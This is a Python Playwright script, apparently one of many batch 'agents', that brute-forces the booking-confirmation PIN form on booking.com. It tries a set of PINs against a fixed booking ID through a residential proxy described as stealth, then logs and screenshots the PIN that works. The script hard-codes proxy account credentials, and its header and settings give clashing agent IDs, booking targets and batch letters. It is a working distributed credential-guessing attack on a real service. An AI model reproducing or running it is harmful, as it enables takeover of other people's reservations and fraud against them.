#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 GHOSTFORM AGENT 088D
Batch: D | Agent: 88
Target: 6339614781
PINs: 8606, 7983, 3826, 4193, 2399
"""

from playwright.sync_api import sync_playwright
import time
import json
import os
from datetime import datetime

# Agent Configuration
AGENT_ID = "088C"
BOOKING_ID = "6860261353"
PINS = ['8606', '7983', '3826', '4193', '2399']
# WAIT_TIME removed - using behavior-based logic instead!

# File paths
LOG_FILE = f"agent_{AGENT_ID}_log.csv"
SUCCESS_FILE = f"victory_{AGENT_ID}.json"
SCREEN_DIR = f"screenshots_{AGENT_ID}"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    """Log result to agent log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"{timestamp},BATCH_C,{AGENT_ID},{BOOKING_ID},{pin},{result},{url}\n")

def log_success(pin, url):
    """Log success to dedicated success file"""
    success_data = {
        "booking_id": BOOKING_ID,
        "success_pin": pin,
        "success_url": url,
        "agent": AGENT_ID,
        "batch": "C",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(success_data, f, indent=2)

print(f"🤖 BATCH C AGENT {AGENT_ID} DEPLOYING...")
print(f"🎯 Target: {BOOKING_ID}")
print(f"🔑 Assigned PINs: 8606, 7983, 3826, 4193, 2399")
print(f"🛡️ Proxy: pr.oxylabs.io:7777")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
    proxy_config = {
        "server": "https://pr.oxylabs.io:7777",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }
    print(f"🛡️ STEALTH MODE: Proxy configured - {proxy_config['server']}")
    
    browser = p.chromium.launch(
        headless=False,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for i, pin in enumerate(PINS, 1):
        print(f"🔑 Agent {AGENT_ID} - Testing PIN {i}/{len(PINS)}: {pin}")
        
        try:
            # LOGIC 1: Open browser and wait until completely loaded
            print("🌐 Opening booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
            print("⏳ Waiting for page to load completely...")
            page.wait_for_load_state("networkidle")  # Wait until no network activity
            print("✅ Page loaded completely!")

            # LOGIC 2: Fill booking ID and PIN, then click continue
            print("📝 Looking for booking ID field...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
            print(f"📝 Filling booking ID: {BOOKING_ID}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            print(f"🔐 Filling PIN: {pin}")
            page.fill('input[placeholder="e.g. 1234"]', pin)
            
            print("🔍 Looking for Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")')
                print("✅ Clicking Continue button...")
                page.click('button:has-text("Continue")')
            except:
                page.wait_for_selector('button[type="submit"]')
                print("✅ Clicking Submit button...")
                page.click('button[type="submit"]')

            # LOGIC 3: Wait for results - behavior-based detection
            print("⏳ Waiting for page response...")
            
            # Wait for either success (URL change) or error message to appear
            try:
                page.wait_for_function("""
                    () => {
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert__content') !== null ||
                                          document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null;
                        
                        return urlChanged || errorBanner;
                    }
                """, timeout=30000)  # 30 second max wait for response
            except:
                print("⚠️ No clear result after 30s, checking current state...")

            # Check results with improved error detection
            current_url = page.url
            print(f"🔍 Current URL: {current_url}")
            
            # Enhanced error detection using boss's selector
            if page.locator("div.bui-alert__content").is_visible():
                error_text = page.locator("div.bui-alert__content").text_content()
                if "We couldn't find a booking" in error_text:
                    print("❌ Error detected: Booking not found")
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
                    log_result(pin, "FAILURE", current_url)
                    fail_count += 1
                else:
                    print(f"❌ Error detected: {error_text}")
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_ERROR_{AGENT_ID}.png")
                    log_result(pin, "ERROR", current_url)
                    fail_count += 1
            
            # Check for SUCCESS: URL contains success indicators
            elif ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                print(f"🎉 SUCCESS! PIN {pin} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_SUCCESS_{AGENT_ID}.png")
                log_result(pin, "SUCCESS", current_url)
                log_success(pin, current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Mission accomplished!")
                break  # Stop testing, we found the PIN!
                
            else:
                print(f"❓ Unknown result for PIN {pin}")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_UNKNOWN_{AGENT_ID}.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f"💥 Error with PIN {pin}: {e}")
            page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_EXCEPTION_{AGENT_ID}.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        # Human-like pause before next PIN (except for last PIN)
        if i < len(PINS):
            print(f"⏳ Moving to next PIN...")
            # No time.sleep - behavior-based logic only!

    browser.close()
    print(f"🏠 Agent {AGENT_ID} mission complete")

print(f"\n--- Agent {AGENT_ID} Summary ---")
print(f"Total attempts: {len(PINS)}")
print(f"Success: {success_count}")
print(f"Failure: {fail_count}")
print(f"Unknown: {unknown_count}")
print(f"Exception: {exception_count}")

if __name__ == "__main__":
    pass
